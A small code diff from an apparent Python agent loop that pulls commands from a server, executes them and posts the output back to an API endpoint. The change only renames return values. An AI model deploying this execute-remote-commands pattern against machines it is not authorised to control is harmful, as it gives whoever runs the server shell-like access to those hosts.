@@ -36,7 +36,7 @@ while True:
 
         if response["command"]:
             print(f"command is {response["command"]}")
-            _, output = simple_command(response["command"])
+            returncode, stdout = simple_command(response["command"])
 
             requests.post(
                 f"{API_URL}/fromagent/result",
